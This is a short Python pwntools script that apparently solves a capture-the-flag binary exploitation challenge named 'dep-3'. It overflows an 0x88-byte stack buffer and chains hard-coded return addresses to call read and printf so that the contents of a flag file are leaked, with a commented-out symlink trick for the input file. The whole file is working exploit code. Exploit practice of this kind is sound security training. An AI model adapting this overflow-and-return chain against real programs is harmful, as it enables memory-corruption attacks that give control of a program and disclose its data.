#!/usr/bin/env python
from pwn import *
import os

ARG1="a.txt"
src='./flag'
#os.symlink(src, ARG1)

# 1st some_process address (0x8048894)
# 2nd read(3, 0xffffd100, 0x100)
# 3rd printf(0xffffd100)

p = process(["./dep-3", ARG1])
#  [ buffer(0x88)] [saved ebp]  [some_fuction]  	[read] 			  [printf] 		  [read-arg1]        [read-arg2]      [read-arg3]	+ 	[printf-arg]
buffer = "A" * 0x88 + "BBBB" + p32(0x8048894) + p32(0x0806d2a0) + p32(0x0804ede0) + p32(0x00000003) + p32(0xffffd100) + p32(0x00000100) + p32(0x00000100)

p.send(buffer)

p.interactive()
